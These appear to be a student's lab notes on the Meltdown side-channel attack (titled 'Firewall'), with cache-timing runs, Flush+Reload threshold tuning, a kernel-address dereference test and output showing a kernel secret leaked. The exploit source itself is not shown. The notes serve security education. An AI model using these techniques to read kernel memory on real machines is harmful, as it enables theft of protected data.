# Firewall

## Task 1 $-$ Reading from Cache versus from Memory
- execute 10 times & compare: `for i in {1..10} ; do ./CacheTime.out ; done`

```bash
    Access time for array[0*4096]: 4828 CPU cycles
    Access time for array[1*4096]: 418 CPU cycles
    Access time for array[2*4096]: 438 CPU cycles
    Access time for array[3*4096]: 202 CPU cycles
    Access time for array[4*4096]: 400 CPU cycles
    Access time for array[5*4096]: 446 CPU cycles
    Access time for array[6*4096]: 1466 CPU cycles
    Access time for array[7*4096]: 194 CPU cycles
    Access time for array[8*4096]: 410 CPU cycles
    Access time for array[9*4096]: 406 CPU cycles
    Access time for array[0*4096]: 5096 CPU cycles
    Access time for array[1*4096]: 434 CPU cycles
    Access time for array[2*4096]: 418 CPU cycles
    Access time for array[3*4096]: 154 CPU cycles
    Access time for array[4*4096]: 442 CPU cycles
    Access time for array[5*4096]: 418 CPU cycles
    Access time for array[6*4096]: 416 CPU cycles
    Access time for array[7*4096]: 224 CPU cycles
    Access time for array[8*4096]: 410 CPU cycles
    Access time for array[9*4096]: 438 CPU cycles
    Access time for array[0*4096]: 4456 CPU cycles
    Access time for array[1*4096]: 396 CPU cycles
    Access time for array[2*4096]: 430 CPU cycles
    Access time for array[3*4096]: 184 CPU cycles
    Access time for array[4*4096]: 414 CPU cycles
    Access time for array[5*4096]: 1270 CPU cycles
    Access time for array[6*4096]: 394 CPU cycles
    Access time for array[7*4096]: 180 CPU cycles
    Access time for array[8*4096]: 390 CPU cycles
    Access time for array[9*4096]: 400 CPU cycles
    Access time for array[0*4096]: 4412 CPU cycles
    Access time for array[1*4096]: 1774 CPU cycles
    Access time for array[2*4096]: 690 CPU cycles
    Access time for array[3*4096]: 702 CPU cycles
    Access time for array[4*4096]: 480 CPU cycles
    Access time for array[5*4096]: 710 CPU cycles
    Access time for array[6*4096]: 712 CPU cycles
    Access time for array[7*4096]: 468 CPU cycles
    Access time for array[8*4096]: 764 CPU cycles
    Access time for array[9*4096]: 552 CPU cycles
    Access time for array[0*4096]: 4814 CPU cycles
    Access time for array[1*4096]: 400 CPU cycles
    Access time for array[2*4096]: 414 CPU cycles
    Access time for array[3*4096]: 166 CPU cycles
    Access time for array[4*4096]: 434 CPU cycles
    Access time for array[5*4096]: 418 CPU cycles
    Access time for array[6*4096]: 1298 CPU cycles
    Access time for array[7*4096]: 186 CPU cycles
    Access time for array[8*4096]: 390 CPU cycles
    Access time for array[9*4096]: 384 CPU cycles
    Access time for array[0*4096]: 4686 CPU cycles
    Access time for array[1*4096]: 404 CPU cycles
    Access time for array[2*4096]: 380 CPU cycles
    Access time for array[3*4096]: 140 CPU cycles
    Access time for array[4*4096]: 382 CPU cycles
    Access time for array[5*4096]: 394 CPU cycles
    Access time for array[6*4096]: 388 CPU cycles
    Access time for array[7*4096]: 170 CPU cycles
    Access time for array[8*4096]: 380 CPU cycles
    Access time for array[9*4096]: 374 CPU cycles
    Access time for array[0*4096]: 4410 CPU cycles
    Access time for array[1*4096]: 372 CPU cycles
    Access time for array[2*4096]: 404 CPU cycles
    Access time for array[3*4096]: 372 CPU cycles
    Access time for array[4*4096]: 392 CPU cycles
    Access time for array[5*4096]: 368 CPU cycles
    Access time for array[6*4096]: 390 CPU cycles
    Access time for array[7*4096]: 196 CPU cycles
    Access time for array[8*4096]: 358 CPU cycles
    Access time for array[9*4096]: 392 CPU cycles
    Access time for array[0*4096]: 3998 CPU cycles
    Access time for array[1*4096]: 356 CPU cycles
    Access time for array[2*4096]: 396 CPU cycles
    Access time for array[3*4096]: 146 CPU cycles
    Access time for array[4*4096]: 364 CPU cycles
    Access time for array[5*4096]: 1008 CPU cycles
    Access time for array[6*4096]: 368 CPU cycles
    Access time for array[7*4096]: 150 CPU cycles
    Access time for array[8*4096]: 378 CPU cycles
    Access time for array[9*4096]: 364 CPU cycles
    Access time for array[0*4096]: 1618 CPU cycles
    Access time for array[1*4096]: 256 CPU cycles
    Access time for array[2*4096]: 258 CPU cycles
    Access time for array[3*4096]: 54 CPU cycles
    Access time for array[4*4096]: 306 CPU cycles
    Access time for array[5*4096]: 230 CPU cycles
    Access time for array[6*4096]: 226 CPU cycles
    Access time for array[7*4096]: 60 CPU cycles
    Access time for array[8*4096]: 238 CPU cycles
    Access time for array[9*4096]: 258 CPU cycles
    Access time for array[0*4096]: 1538 CPU cycles
    Access time for array[1*4096]: 258 CPU cycles
    Access time for array[2*4096]: 230 CPU cycles
    Access time for array[3*4096]: 68 CPU cycles
    Access time for array[4*4096]: 256 CPU cycles
    Access time for array[5*4096]: 318 CPU cycles
    Access time for array[6*4096]: 1020 CPU cycles
    Access time for array[7*4096]: 272 CPU cycles
    Access time for array[8*4096]: 448 CPU cycles
    Access time for array[9*4096]: 436 CPU cycles

```

- filter 3 & 7: `for i in {1..10} ; do ./CacheTime.out ; done | grep '\[[3|7]'`
    ```bash
        Access time for array[3*4096]: 218 CPU cycles
        Access time for array[7*4096]: 260 CPU cycles
        Access time for array[3*4096]: 214 CPU cycles
        Access time for array[7*4096]: 204 CPU cycles
        Access time for array[3*4096]: 130 CPU cycles
        Access time for array[7*4096]: 218 CPU cycles
        Access time for array[3*4096]: 200 CPU cycles
        Access time for array[7*4096]: 122 CPU cycles
        Access time for array[3*4096]: 216 CPU cycles
        Access time for array[7*4096]: 202 CPU cycles
        Access time for array[3*4096]: 200 CPU cycles
        Access time for array[7*4096]: 218 CPU cycles
        Access time for array[3*4096]: 210 CPU cycles
        Access time for array[7*4096]: 120 CPU cycles
        Access time for array[3*4096]: 108 CPU cycles
        Access time for array[7*4096]: 192 CPU cycles
        Access time for array[3*4096]: 196 CPU cycles
        Access time for array[7*4096]: 184 CPU cycles
        Access time for array[3*4096]: 188 CPU cycles
        Access time for array[7*4096]: 108 CPU cycles
    ```
- average, not useful: `echo `for i in {1..10} ; do ./CacheTime.out ; done | grep '\[[3|7]' | cut -f2 -d ':'  | awk '{print $1}' | paste -sd+ | bc`/20 | bc`

## Task 2 
- runnin multiple times adjusting the threshold:
```bash
for i in {1..1000} ;  do ./FlushReload.out ; done | grep -i secret | grep -v 94
```
- we can assume empiricall that 200 is the maximum safe value as threshold

## Task 3
just run
```
$ make
$ sudo insmod MeltdownKernel.ko
$ dmesg | grep ’secret data address’
```

got: [ 1170.385391] secret data address:00000000cfccc030

# Task 4
we can confirm it's not working straight out of the  box
```c
#include <stdio.h>
int main() {
char *kernel_data_addr = (char*)0xfb61b000;
char kernel_data = *kernel_data_addr;
printf("I have reached here.\n");
return 0;
}
```

# Task 5
- replace the address in ExceptionHandling with the one we found earlier
- we always get "Memory access violation"

# Task 6
- change address as ususal in MeltDownExperiment
- we can see that at totally random times we get the secret, while we can have intervals of thousands of executions in which we never get anything
```
[11/07/22]seed@VM:~/.../Labsetup$ for i in {1..100} ; do ./MeltdownExperiment.out ; done |uniq
Memory access violation!
array[7*4096 + 1024] is in cache.
The Secret = 7.
Memory access violation!
array[7*4096 + 1024] is in cache.
The Secret = 7.
Memory access violation!
array[7*4096 + 1024] is in cache.
The Secret = 7.
Memory access violation!
array[7*4096 + 1024] is in cache.
The Secret = 7.
Memory access violation!
array[7*4096 + 1024] is in cache.
The Secret = 7.
Memory access violation!
array[7*4096 + 1024] is in cache.
The Secret = 7.
Memory access violation!
array[7*4096 + 1024] is in cache.
The Secret = 7.
Memory access violation!
array[7*4096 + 1024] is in cache.
The Secret = 7.
[11/07/22]seed@VM:~/.../Labsetup$ 
```